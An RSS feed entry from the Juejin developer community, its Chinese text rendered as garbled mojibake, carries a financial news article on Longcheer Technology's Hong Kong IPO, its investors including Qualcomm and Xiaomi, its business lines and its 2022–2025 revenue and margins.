<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[é«˜é€šç ¸é’±ã€é›·å†›å…¥è‚¡ï¼åˆšåˆšï¼Œä¸Šæµ·è¯ç”Ÿä¸€ä¸ª183äº¿æ‰‹æœºä»£å·¥å·¨å¤´]]></title>    <link>https://juejin.cn/post/7597724783649128488</link>    <guid>https://juejin.cn/post/7597724783649128488</guid>    <pubDate>2026-01-22T06:16:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597724783649128488" data-draft-id="7597742970281066548" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é«˜é€šç ¸é’±ã€é›·å†›å…¥è‚¡ï¼åˆšåˆšï¼Œä¸Šæµ·è¯ç”Ÿä¸€ä¸ª183äº¿æ‰‹æœºä»£å·¥å·¨å¤´"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-22T06:16:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é‡å­ä½"/> <meta itemprop="url" content="https://juejin.cn/user/2858385963484488"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é«˜é€šç ¸é’±ã€é›·å†›å…¥è‚¡ï¼åˆšåˆšï¼Œä¸Šæµ·è¯ç”Ÿä¸€ä¸ª183äº¿æ‰‹æœºä»£å·¥å·¨å¤´
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2858385963484488/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é‡å­ä½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T06:16:44.000Z" title="Thu Jan 22 2026 06:16:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å…¨çƒæ™ºèƒ½æ‰‹æœºä»£å·¥æ‰›æŠŠå­ï¼Œåˆšåˆšæ‹¿ä¸‹<strong>æ¸¯è‚¡ â€œæ¶ˆè´¹ç”µå­ ODM ç¬¬ä¸€è‚¡â€</strong>ï¼</p>
<p>æ¥è‡ªä¸Šæµ·çš„<strong>é¾™æ——ç§‘æŠ€</strong>ï¼Œä»Šå¤©æˆåŠŸç™»é™†æ¸¯äº¤æ‰€ï¼Œå¼€ç›˜ä»· <strong>35 æ¸¯å…ƒ / è‚¡</strong>ï¼Œè¾ƒå‘è¡Œä»·é«˜çº¦ 12.9%ï¼Œå¼€ç›˜å¸‚å€¼ <strong>182.9 äº¿æ¸¯å…ƒ</strong>ã€‚</p>
<p>æ›´æ—©ä¹‹å‰ï¼Œè¿™å®¶å…¬å¸å·²äº 2024 å¹´ 3 æœˆåœ¨ä¸Šäº¤æ‰€ä¸»æ¿ç™»å½•ï¼Œå½“å‰æœ€æ–°å¸‚å€¼çº¦ 231 äº¿å…ƒï¼Œå·²å®Œæˆ â€œA+Hâ€ è‚¡ä¸Šå¸‚å¸ƒå±€ã€‚</p>
<p>æœ¬æ¬¡èµ´æ¸¯ä¸Šå¸‚ï¼Œé«˜é€šã€æ±Ÿè¥¿å›½æ§ã€OmniVision ç­‰å¤šå®¶åŸºçŸ³æŠ•èµ„è€…å‰æ¥ç«™é˜Ÿï¼Œå…±åŒè®¤è´­äº† 5650 ä¸‡ç¾å…ƒï¼›å°ç±³ä¹Ÿæ˜¯è¿™å®¶å…¬å¸çš„é‡è¦æŠ•èµ„è€…ï¼Œæ•²é’Ÿå‰æŒæœ‰é¾™æ——ç§‘æŠ€ 4.94% çš„è‚¡ä»½ã€‚</p>
<p>åœ¨æ™ºèƒ½æ‰‹æœº â€œä»£å·¥â€ å¸‚åœºï¼Œé¾™æ——ç‹¬å å…¨çƒä¸‰åˆ†ä¹‹ä¸€ä»½é¢ï¼Œä½ åœ¨ç”¨çš„<strong>å°ç±³ã€ä¸‰æ˜Ÿã€è”æƒ³ã€è£è€€ã€OPPOã€vivo</strong> ç­‰å“ç‰Œéƒ½æ˜¯è¿™å®¶å…¬å¸çš„å®¢æˆ·ã€‚</p>
<h2 data-id="heading-0">æ¸¯è‚¡ â€œæ¶ˆè´¹ç”µå­ ODM ç¬¬ä¸€è‚¡â€ æ¥äº†</h2>
<p>åˆšåˆšï¼Œæ¸¯è‚¡ â€œæ¶ˆè´¹ç”µå­ ODM ç¬¬ä¸€è‚¡â€ ä¸Šæµ·é¾™æ——ç§‘æŠ€ï¼Œæ­£å¼ä¸Šå¸‚ã€‚</p>
<p>å…¬å¸é¦–æ¬¡å…¬å¼€å‘è¡Œåæ€»è‚¡æœ¬ä¸º 5225.91 ä¸‡è‚¡ï¼Œå…¶ä¸­é¦™æ¸¯å…¬å¼€å‘å”® 10%ï¼Œå›½é™…å‘å”® 90%ã€‚</p>
<p>å‘è¡Œä»· <strong>31 æ¸¯å…ƒ / è‚¡</strong>ï¼Œå‹Ÿèµ„æ€»é¢ä¸º 16.2 äº¿æ¸¯å…ƒï¼Œå‹Ÿèµ„å‡€é¢çº¦ 15.21 äº¿æ¸¯å…ƒã€‚</p>
<p>æ•²é’Ÿå‰ï¼Œé¾™æ——ç§‘æŠ€çš„åŸºçŸ³æŠ•èµ„è€…â€”â€”Qualcommï¼ˆé«˜é€šï¼‰ã€æ±Ÿè¥¿å›½æ§ã€OmniVisionã€é¦™æ¸¯è£•åŒã€é’å²›è§‚æ¾œåŠå›½æ³°å›å®‰è¯åˆ¸æŠ•èµ„ï¼ˆé¦™æ¸¯ï¼‰æœ‰é™å…¬å¸ã€Endless Growthï¼Œå…±è®¤è´­äº† 5_6__50 ä¸‡ç¾å…ƒï¼ˆçº¦ 4.4 äº¿æ¸¯å…ƒï¼‰ã€‚_</p>
<p>ä»Šæ—¥æ•²é’Ÿï¼Œå…¬å¸æ¸¯è‚¡å¼€ç›˜ä»·ä¸º 35 æ¸¯å…ƒ / è‚¡ï¼Œå¼€ç›˜å¸‚å€¼ 182.9 äº¿æ¸¯å…ƒã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/617e92fea3b041f89da617f771ab5cbb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769667404&amp;x-signature=Q41aGW8mf3wrx6co9ijieITi3rE%3D" alt="" loading="lazy"/></p>
<p>è€Œæˆªè‡³å‘ç¨¿å‰ï¼Œé¾™æ——åœ¨ A è‚¡çš„è‚¡ä»·ä¸º 49.25 å…ƒ / è‚¡ï¼Œå¸‚å€¼çº¦ä¸º 231 äº¿å…ƒã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/edba11ac3402454d883108c493fa1df5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769667404&amp;x-signature=iN7koyS2eJRPnPzOBLKsp6CHqFU%3D" alt="" loading="lazy"/></p>
<p>æœ¬æ¬¡å†²åˆºæ¸¯è‚¡ IPO å‹Ÿèµ„ï¼Œé¾™æ——ç§‘æŠ€å®åˆ™æœ‰æ›´æ·±è¿œçš„ç”¨é€”ï¼š</p>
<ul>
<li>
<p>é¦–è¦ç›®çš„æ˜¯<strong>æ‰©å¤§äº§èƒ½</strong>ï¼Œæµ·å†…å¤–å¸‚åœºéƒ½è¦æå‡å…¬å¸çš„ç”Ÿäº§èƒ½åŠ›ï¼›</p>
</li>
<li>
<p>å…¶æ¬¡æ˜¯<strong>åŠ å¤§ç ”å‘</strong>ï¼Œé‡ç‚¹åŠ å¼ºæ ¸å¿ƒæŠ€æœ¯åˆ›æ–°ï¼Œæ¯”å¦‚ AI ç›¸å…³æŠ€æœ¯ï¼›</p>
</li>
<li>
<p>å…¶ä½™éƒ¨åˆ†ï¼Œåˆ™åˆ†åˆ«ä¼šç”¨ä½œæ‹“å±•å¸‚åœºã€æˆ˜ç•¥æŠ•èµ„ä»¥åŠè¡¥å……æµåŠ¨èµ„é‡‘ã€‚</p>
</li>
</ul>
<p>è¿™ç©¶ç«Ÿæ˜¯ä¸€å®¶æ€æ ·çš„å…¬å¸å‘¢ï¼Ÿ</p>
<h2 data-id="heading-1">å…¨çƒæœ€å¤§æ™ºèƒ½æ‰‹æœº ODM å†²åˆºè‚¡</h2>
<p>ä¸Šæµ·é¾™æ——ç§‘æŠ€_ï¼ˆä»¥ä¸‹ç®€ç§° â€œé¾™æ——â€ï¼‰_ï¼Œåœ¨æ‹›è‚¡ä¸­çš„å®šä½æ˜¯ä¸€å®¶<strong>æ™ºèƒ½äº§å“å’ŒæœåŠ¡æä¾›å•†</strong>ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„ ODMï¼ˆåŸå§‹è®¾è®¡åˆ¶é€ å•†ï¼‰ã€‚</p>
<p>å…¶æ ¸å¿ƒä¸šåŠ¡ï¼Œæ˜¯ä¸ºæ™ºèƒ½äº§å“å“ç‰Œå•†ã€ç§‘æŠ€ä¼ä¸šç­‰æä¾›äº§å“ç ”ç©¶ã€è®¾è®¡ã€åˆ¶é€ åŠæ”¯æŒç­‰ä¸€ç³»åˆ—è§£å†³æ–¹æ¡ˆï¼Œä¸»è¦èšç„¦<strong>æ¶ˆè´¹ç”µå­é¢†åŸŸ</strong>ã€‚</p>
<p>ä¸ºæ­¤ï¼Œé¾™æ——ç§‘æŠ€å·²æ„å»ºèµ·æ¶µç›–æ–¹æ¡ˆè®¾è®¡ã€ç¡¬ä»¶åˆ›æ–°ã€ç³»ç»Ÿçº§è½¯ä»¶å¹³å°å¼€å‘ã€ç²¾ç›Šåˆ¶é€ ã€ä¾›åº”é“¾æ•´åˆåŠè´¨é‡æ§åˆ¶çš„è§£å†³æ–¹æ¡ˆçŸ©é˜µã€‚</p>
<p>åœ¨è¿™ä¸€åŸºç¡€ä¸Šï¼Œå…¬å¸æ¨å‡ºäº†æ™ºèƒ½æ‰‹æœºã€AI PCã€æ±½è½¦ç”µå­ã€å¹³æ¿ç”µè„‘ã€æ™ºèƒ½æ‰‹è¡¨ã€æ™ºèƒ½çœ¼é•œç­‰äº§å“ç»„åˆã€‚</p>
<p>é¾™æ——å°†è¿™äº›äº§å“æ•´åˆæˆäº†ä¸€ä¸ªã€Œ1+2+Xã€çš„æ¡†æ¶ï¼š</p>
<ul>
<li>
<p>â€œ1â€ æ˜¯å…¬å¸æ ¸å¿ƒä¸»ä¸šåŠ¡<strong>æ™ºèƒ½æ‰‹æœº</strong>ï¼›</p>
</li>
<li>
<p>â€œ2â€ ä»£è¡¨ä»¥ <strong>AI PC å’Œæ±½è½¦ç”µå­ä¸šåŠ¡</strong>ä¸ºé‡ç‚¹çš„å‘å±•ä¸šåŠ¡ï¼›</p>
</li>
<li>
<p>â€œ3â€ åˆ™æ˜¯æ–°å…´æ¶ˆè´¹ç”µå­é¢†åŸŸå¤šå“ç±»ä¸šåŠ¡ï¼ŒåŒ…æ‹¬å¹³æ¿ã€ç©¿æˆ´ã€TWS è€³æœºã€æ™ºèƒ½çœ¼é•œç­‰ç­‰ã€‚</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a657e7640a54b479cc09331cf8fd980~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769667404&amp;x-signature=XYtOYopV9Wh0Nfrg0CVgo%2BAUFCg%3D" alt="" loading="lazy"/></p>
<p>å…·ä½“è€Œè¨€ï¼Œ<strong>æ™ºèƒ½æ‰‹æœº</strong>æ˜¯å…¬å¸ä¸šåŠ¡çš„ä¸»è¦åŠ¨åŠ›ï¼Œæä¾›ä»äº§å“æ¦‚å¿µè®¾è®¡ã€ç¡¬ä»¶å¼€å‘ã€è½¯ä»¶å¼€å‘åˆ°æµ‹è¯•éªŒè¯çš„å…¨æµç¨‹ç ”å‘æœåŠ¡ï¼Œä»¥åŠè§„æ¨¡åŒ–ç”Ÿäº§åˆ¶é€ æ”¯æŒã€‚</p>
<p>æ ¹å¼—è‹¥æ–¯ç‰¹æ²™åˆ©æ–‡çš„èµ„æ–™ï¼Œ2024 å¹´ï¼Œé¾™æ——çš„æ™ºèƒ½æ‰‹æœº ODM å‡ºè´§é‡è¾¾ <strong>1.73 äº¿å°</strong>ã€‚</p>
<p>åŒå¹´ï¼Œåœ¨ä»¥å‡ºè´§é‡è®¡çš„æ™ºèƒ½æ‰‹æœºå‰åå“ç‰Œä¸­ï¼Œé¾™æ——å’Œå…¶ä¸­<strong>å…«å®¶</strong>éƒ½å»ºç«‹äº†ä¸šåŠ¡åˆä½œï¼Œå¹¶ä¸”å¹³å‡åˆä½œå¹´é™éƒ½åœ¨äº”å¹´ä»¥ä¸Šã€‚</p>
<p>AI PC æ–¹é¢ï¼Œé¾™æ——ç§‘æŠ€å·²ç»„å»º AI PC äº§å“ç ”å‘ã€ç”Ÿäº§åˆ¶é€ ã€è´¨é‡ç®¡ç†ç­‰ç«¯åˆ°ç«¯ä¸“ä¸šå›¢é˜Ÿï¼Œå®Œæˆå…¨é¢å¸ƒå±€ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/771c4b4a8b1548ecb676e24de32b0cf5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769667404&amp;x-signature=QKxDP6grMCLIs3t7HrGYkkdEy9E%3D" alt="" loading="lazy"/></p>
<p>2024 å¹´ç¬¬ä¸‰å­£åº¦ï¼Œé¾™æ——æ¨å‡ºäº†é¦–æ¬¾æ­è½½é«˜é€šéªé¾™å¤„ç†å™¨çš„ç¬”è®°æœ¬ç”µè„‘äº§å“ï¼Œä»¥å®ç°å•†ç”¨å’Œæ¶ˆè´¹é¢†åŸŸ AI åº”ç”¨çš„æ‹“å±•ã€‚</p>
<p>æ±½è½¦ç”µå­æ–¹é¢ï¼Œå…¬å¸è‡ª 2022 å¹´æˆç«‹æ±½è½¦ç”µå­ä¸šåŠ¡å›¢é˜Ÿä»¥æ¥ï¼Œå·²ä¸å°ç±³ã€è”šæ¥ç­‰ OEM åŠä¸€çº§å®¢æˆ·å»ºç«‹åˆä½œä¼™ä¼´å…³ç³»ï¼Œè·å¾—è¶…è¿‡åä¸ªå®šç‚¹é¡¹ç›®ã€‚</p>
<p>æœ€ååœ¨æ–°å…´å“ç±»ä¸­ï¼Œé¾™æ——ç§‘æŠ€æ­£åœ¨ç§¯æå¸ƒå±€ AI ä¸æ™ºèƒ½åˆ¶é€ é¢†åŸŸï¼Œå¹¶ä¸”åœ¨ AIoT ç­‰æ–¹é¢è¿›å±•è¿…çŒ›ã€‚</p>
<p>2024 å¹´ï¼Œé¾™æ——å·²å’Œäº’è”ç½‘å¤´éƒ¨å®¢æˆ·åˆä½œï¼Œæ¨å‡ºå¤šæ¬¾æ™ºèƒ½çœ¼é•œï¼Œæ€»å‡ºè´§é‡å·²ç»è¶…è¿‡ 200 ä¸‡å°ï¼›æ®å¼—è‹¥æ–¯ç‰¹æ²™åˆ©æ–‡çš„èµ„æ–™ï¼Œå…¬å¸åœ¨æ™ºèƒ½æ‰‹è¡¨ / æ‰‹ç¯ã€æ™ºèƒ½çœ¼é•œç­‰é¢†åŸŸçš„å‡ºè´§é‡å·²è·ƒå±…è¡Œä¸šå‰äºŒã€‚</p>
<p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œé¾™æ——çš„å®¢æˆ·æ¶µç›–å°ç±³ã€ä¸‰æ˜Ÿã€è”æƒ³ã€è£è€€ã€OPPOã€vivo ç­‰å“ç‰Œï¼›å…¶ä¸­ï¼Œ<strong>å°ç±³æ˜¯é¾™æ——çš„æœ€å¤§å®¢æˆ·</strong>ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df6c4bbfa44b42d3b454a69b7ad19725~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769667404&amp;x-signature=4vXKHvyb86DWMP4gHq4302QYS8s%3D" alt="" loading="lazy"/></p>
<p>ä»¥ 2024 å¹´æ¶ˆè´¹ç”µå­ ODM å‡ºè´§é‡è®¡ï¼Œé¾™æ——æ˜¯å…¨çƒç¬¬äºŒå¤§çš„æ¶ˆè´¹ç”µå­ ODM å‚å•†ï¼Œå æ® 22.4% çš„å¸‚åœºä»½é¢ã€‚</p>
<p>ç¬¬ä¸€åˆ™æ˜¯åŒæ ·ä½äºä¸Šæµ·ï¼Œå¹¶å·²åœ¨ A è‚¡ä¸Šå¸‚ï¼Œæ­£åœ¨å†²åˆºæ¸¯è‚¡ IPO çš„åå‹¤æŠ€æœ¯ã€‚</p>
<p>è€Œé¾™æ——åœ¨æ™ºèƒ½æ‰‹æœº ODM å‡ºè´§é‡çš„å¸‚å ç‡è¾¾ <strong>32.6%</strong>ï¼Œå·²æ˜¯<strong>å…¨çƒæœ€å¤§çš„æ™ºèƒ½æ‰‹æœº ODM å‚å•†</strong>ã€‚</p>
<p>è¿™æ ·çš„å¸‚åœºä»½é¢ï¼Œåœ¨è´¢åŠ¡å±‚é¢ä¸ºé¾™æ——ç§‘æŠ€å¸¦æ¥äº†æ€æ ·çš„æ”¶è·ï¼Ÿ</p>
<h2 data-id="heading-2">ä¸Šæµ·é¾™æ——ç§‘æŠ€è´¢åŠ¡è¡¨ç°å¦‚ä½•ï¼Ÿ</h2>
<p>2022 å¹´~ 2024 å¹´ï¼Œå…¬å¸è¥ä¸šæ”¶å…¥åˆ†åˆ«ä¸º 293.4 äº¿å…ƒã€271.9 äº¿å…ƒå’Œ 463.8 äº¿å…ƒã€‚</p>
<p>2025 å¹´å‰ 9 ä¸ªæœˆï¼Œå…¬å¸è¥ä¸šæ”¶å…¥ä¸º 313.3 äº¿å…ƒï¼ŒåŒæ¯”ä¸‹æ»‘ 10.3%ã€‚</p>
<p>2024 å¹´çš„çŒ›æ¶¨æ˜¯å› ä¸º 5G æ‰‹æœºæ”¾é‡åŠ AIoT çˆ†å‘ï¼Œ2025 å¹´çš„ä¸‹é™åˆ™æ˜¯å› ä¸ºæˆ˜ç•¥è°ƒæ•´ï¼Œæ”¾å¼ƒä½æ¯›åˆ©è®¢å•ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e69de39ebfed46fc809f999f80783739~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769667404&amp;x-signature=04d%2FtFJ3Q8UugJgfMnd5WxIgzVQ%3D" alt="" loading="lazy"/></p>
<p>æŒ‰ç…§äº§å“ç±»å‹åˆ’åˆ†æ”¶å…¥ï¼Œå¯ä»¥åˆ’ä¸ºæ™ºèƒ½æ‰‹æœºã€AIoT åŠå…¶ä»–äº§å“ã€å¹³æ¿ç”µè„‘ç­‰ã€‚</p>
<p>å…¶ä¸­ï¼Œ<strong>æ™ºèƒ½æ‰‹æœº</strong>æ˜¯å…¬å¸ä¸»è¦çš„æ”¶å…¥æ¥æºï¼Œ2022 å¹´~ 2024 å¹´å·²ç» 2025 å¹´å‰ 9 ä¸ªæœˆï¼Œç›¸å…³æ”¶å…¥åˆ†åˆ«ä¸º 242.7 äº¿å…ƒã€218.2 äº¿å…ƒã€361.3 äº¿å…ƒä»¥åŠ 217 äº¿å…ƒï¼Œåˆ†åˆ«å åŒæœŸæ€»æ”¶å…¥çš„ 82.7%ã€80.3%ã€77.9% å’Œ 69.3%ã€‚</p>
<p>AIoT åŠå…¶ä»–äº§å“å¢é€Ÿæ›´æ˜æ˜¾ï¼Œ2022 å¹´~ 2024 å¹´ä»¥åŠ 2025 å¹´å‰ä¸‰å­£åº¦ï¼Œåˆ†åˆ«ä¸ºå…¬å¸è´¡çŒ®äº† 6.5%ã€9.2%ã€12%ã€17.9% çš„æ”¶å…¥ï¼Œå æ¯”é€æ­¥æ‰©å¤§ã€‚</p>
<p>è€ŒåŒæœŸï¼Œå¹³æ¿ç”µè„‘æ”¶å…¥æ¯”é‡åˆ™ä¸º 9.5%ã€9.2%ã€8% å’Œ 9.5%ï¼Œç»´æŒè¾ƒç¨³å®šæ°´å¹³ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d61670c31ee4ce3a770cdb10ac8169b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769667404&amp;x-signature=hw2wS5v9t951ydZtqTaiLrxlI%2BI%3D" alt="" loading="lazy"/></p>
<p>å…¬å¸å‰äº”å¤§å®¢æˆ·è´¡çŒ®äº†å¤§éƒ¨åˆ†æ”¶å…¥ï¼Œä¾‹å¦‚ 2024 å¹´å æ€»æ”¶å…¥çš„ 82.2%ã€‚</p>
<p>å…¶ä¸­ï¼Œç¬¬ä¸€å¤§å®¢æˆ·<strong>å°ç±³</strong>ï¼Œåœ¨ 2022 å¹´ã€2023 å¹´ã€2024 å¹´å’Œ 2025 å¹´å‰ 9 ä¸ªæœˆï¼Œä¸ºé¾™æ——è´¡çŒ®çš„æ”¶å…¥åˆ†åˆ«ä¸º 133.6 äº¿å…ƒã€115.2 äº¿å…ƒã€172.6 äº¿å…ƒå’Œ 89.5 äº¿å…ƒã€‚</p>
<p>å¯¹åº”åŒæœŸæ‰€å é›†å›¢æ€»æ”¶å…¥æ¯”ä¾‹åˆ†åˆ«ä¸º 45.5%ã€42.4%ã€37.2% åŠ 28.6%ã€‚</p>
<p>å†çœ‹åˆ©æ¶¦å±‚é¢ï¼Œ2022 å¹´~ 2024 å¹´ï¼Œå…¬å¸æ¯›åˆ©ç‡åˆ†åˆ«ä¸º 8.1%ã€9.5% å’Œ 5.8%ï¼›2025 å¹´å‰ 9 ä¸ªæœˆï¼Œå…¬å¸æ¯›åˆ©ç‡å›å‡åˆ°çš„ 8.3%ã€‚</p>
<p>æ‹›è‚¡ä¹¦è§£é‡Šï¼Œ2024 å¹´æ¯›åˆ©ç‡æ˜æ˜¾ä¸‹æ»‘ï¼ŒåŸå› åŒ…æ‹¬åŸææ–™é‡‡è´­ä»·å› å¸‚åœºæ³¢åŠ¨å¢åŠ ï¼Œä»¥åŠå…¬å¸çš„æˆ˜ç•¥æ€§å¸‚åœºæ‹“å±•ã€‚</p>
<p>2025 å¹´å›æš–ï¼Œä¸»è¦ç”±äºæå‡é¡¹ç›®å“è´¨ï¼Œå¹¶ç­–ç•¥æ€§æ”¾å¼ƒè‹¥å¹²ä½åˆ©æ¶¦é¡¹ç›®ï¼ŒåŒæ—¶å¸‚åœºåŸæ–™ä»·æ ¼è¶‹äºç¨³å®šï¼Œç»ˆç»“ 2024 å¹´è§‚å¯Ÿåˆ°çš„ä¸Šæ¶¨è¶‹åŠ¿ã€‚</p>
